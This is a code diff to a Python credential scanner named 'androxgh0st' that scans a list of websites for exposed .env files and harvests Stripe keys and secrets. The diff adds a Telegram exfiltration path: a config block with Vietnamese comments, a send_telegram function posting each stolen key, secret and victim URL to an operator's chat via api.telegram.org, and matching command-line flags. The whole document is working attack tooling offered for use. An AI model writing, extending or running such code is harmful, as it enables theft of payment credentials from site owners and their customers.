@@ -37,6 +37,13 @@ logging.getLogger('urllib3.connectionpool').setLevel(logging.ERROR)
 
 pid_restore = '.nero_swallowtail'
 
+# ====== TELEGRAM CONFIGURATION ======
+# Điền thông tin Telegram bot của bạn vào đây để tự động gửi thông báo
+# Nếu để rỗng, có thể truyền qua command line: --telegram-bot-token và --telegram-chat-id
+TELEGRAM_BOT_TOKEN = ""  # Ví dụ: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
+TELEGRAM_CHAT_ID = ""    # Ví dụ: "123456789"
+# ====================================
+
 # Global runtime configuration (set in main)
 SESSION = None
 ARGS = None
@@ -158,10 +165,44 @@ class androxgh0st:
 				with open(ARGS.json_out, 'a') as jf:
 					entry = {"url": url, "method": method, "stripe_key": stripe_key, "stripe_secret": stripe_secret}
 					jf.write(json.dumps(entry)+"\n")
+
+		# Send Telegram notification if configured
+		# Ưu tiên command line arguments, nếu không có thì dùng config trong file
+		bot_token = (ARGS.telegram_bot_token if (ARGS and ARGS.telegram_bot_token) else TELEGRAM_BOT_TOKEN)
+		chat_id = (ARGS.telegram_chat_id if (ARGS and ARGS.telegram_chat_id) else TELEGRAM_CHAT_ID)
+
+		if bot_token and chat_id:
+			telegram_message = f"🔑 <b>STRIPE KEY FOUND!</b>\n\n"
+			telegram_message += f"<b>URL:</b> {url}\n"
+			telegram_message += f"<b>METHOD:</b> {method}\n"
+			telegram_message += f"<b>STRIPE_KEY:</b> <code>{stripe_key}</code>\n"
+			telegram_message += f"<b>STRIPE_SECRET:</b> <code>{stripe_secret}</code>"
+			send_telegram(telegram_message, bot_token, chat_id)
+
 		return True
 
 def printf(text):
 	print(text)
+
+def send_telegram(message, bot_token, chat_id):
+	"""Send message to Telegram bot"""
+	try:
+		url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+		data = {
+			"chat_id": chat_id,
+			"text": message,
+			"parse_mode": "HTML"
+		}
+		response = requests.post(url, data=data, timeout=10)
+		if response.status_code == 200:
+			logger.info("Telegram notification sent successfully")
+			return True
+		else:
+			logger.error(f"Failed to send Telegram: {response.status_code} - {response.text}")
+			return False
+	except Exception as e:
+		logger.error(f"Error sending Telegram message: {str(e)}")
+		return False
 
 def cleanup_handler(signum=None, frame=None):
 	"""Graceful shutdown handler"""
@@ -301,6 +342,8 @@ if __name__ == '__main__':
 		parser.add_argument('--paths', dest='paths', nargs='*', help='Additional .env paths to try')
 		parser.add_argument('--rate', dest='rate', type=float, default=0.0, help='Sleep seconds between requests per task')
 		parser.add_argument('--json-out', dest='json_out', help='Write JSONL output to this file')
+		parser.add_argument('--telegram-bot-token', dest='telegram_bot_token', help='Telegram bot token for notifications')
+		parser.add_argument('--telegram-chat-id', dest='telegram_chat_id', help='Telegram chat ID to send notifications')
 		args = parser.parse_args()
 		if not args.list:
 			args.list = input("websitelist ? ")
